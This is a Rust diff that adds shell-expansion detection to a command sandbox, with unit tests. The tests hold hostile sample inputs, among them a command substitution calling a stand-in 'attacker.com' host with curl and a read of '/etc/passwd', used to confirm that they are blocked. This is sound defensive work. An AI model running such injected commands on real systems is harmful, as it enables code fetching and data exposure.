@@ -38,6 +38,10 @@ pub enum SandboxError {
     /// Symlink escape detected
     #[error("Symlink escape detected: {0}")]
     SymlinkEscape(String),
+
+    /// Shell expansion detected in argument
+    #[error("Shell expansion detected in argument: {0}")]
+    ShellExpansion(String),
 }
 
 /// Bash command sandbox
@@ -62,6 +66,7 @@ impl Sandbox {
     /// Returns `SandboxError::InvalidPath` if command is empty or contains null bytes
     /// Returns `SandboxError::PathTraversal` if command contains path traversal sequences
     /// Returns `SandboxError::PathOutsideWorkspace` if command references paths outside workspace
+    /// Returns `SandboxError::ShellExpansion` if command contains dangerous shell expansions
     pub fn validate_command(&self, command: &str) -> Result<(), SandboxError> {
         // Extract main command
         let main_cmd = extract_command(command)
@@ -92,6 +97,11 @@ impl Sandbox {
             // Skip command name itself
             if self.whitelist.is_allowed(arg) {
                 continue;
+            }
+
+            // Check for dangerous shell expansions
+            if contains_shell_expansion(arg) {
+                return Err(SandboxError::ShellExpansion(arg.clone()));
             }
 
             // Remove surrounding quotes and check if it's a file path
@@ -195,6 +205,44 @@ impl Default for Sandbox {
     fn default() -> Self {
         Self::new(SandboxConfig::default())
     }
+}
+
+/// Check if a string contains dangerous shell expansions
+/// Detects: variable expansion ($VAR), command substitution ($() or `cmd`),
+/// arithmetic expansion ($(( ))), process substitution (<() or >())
+fn contains_shell_expansion(s: &str) -> bool {
+    // Variable expansion: $VAR or ${VAR}
+    if s.contains('$') {
+        // Check for various expansion patterns
+        if ["$(", "${", "$((", "$["].iter().any(|&p| s.contains(p)) {
+            return true;
+        }
+        // Check for bare $ followed by alphanumeric or _
+        if s.chars()
+            .collect::<Vec<_>>()
+            .windows(2)
+            .any(|w| w[0] == '$' && (w[1].is_alphanumeric() || w[1] == '_'))
+        {
+            return true;
+        }
+    }
+
+    // Backtick command substitution: `cmd`
+    if s.contains('`') {
+        return true;
+    }
+
+    // Process substitution: <(cmd) or >(cmd)
+    if s.contains("<(") || s.contains(">(") {
+        return true;
+    }
+
+    // Tilde expansion: ~user
+    if s.starts_with('~') {
+        return true;
+    }
+
+    false
 }
 
 /// Parse shell command arguments respecting quoting rules
@@ -333,6 +381,30 @@ mod tests {
     }
 
     #[test]
+    fn test_validate_shell_expansion_blocked() {
+        let sandbox = Sandbox::default();
+
+        // Variable expansion
+        assert!(sandbox.validate_command("cat $HOME/file").is_err());
+        assert!(sandbox.validate_command("cat ${HOME}/file").is_err());
+
+        // Command substitution
+        assert!(sandbox.validate_command("cat $(whoami)").is_err());
+        assert!(sandbox.validate_command("cat `whoami`").is_err());
+        assert!(
+            sandbox
+                .validate_command("cat \"$(curl attacker.com)\"")
+                .is_err()
+        );
+
+        // Process substitution
+        assert!(sandbox.validate_command("cat <(echo hello)").is_err());
+
+        // Tilde expansion
+        assert!(sandbox.validate_command("cat ~/file").is_err());
+    }
+
+    #[test]
     fn test_validate_relative_path_inside_workspace() {
         let temp_dir = tempfile::tempdir().expect("Failed to create temp dir");
 
@@ -366,6 +438,18 @@ mod tests {
                 .is_ok()
         );
         assert!(sandbox.validate_path("/etc/passwd").is_err());
+    }
+
+    #[test]
+    fn test_contains_shell_expansion() {
+        assert!(contains_shell_expansion("$HOME"));
+        assert!(contains_shell_expansion("${HOME}"));
+        assert!(contains_shell_expansion("$(whoami)"));
+        assert!(contains_shell_expansion("`whoami`"));
+        assert!(contains_shell_expansion("<(echo hello)"));
+        assert!(contains_shell_expansion("~/file"));
+        assert!(!contains_shell_expansion("file.txt"));
+        assert!(!contains_shell_expansion("/path/to/file"));
     }
 
     #[test]
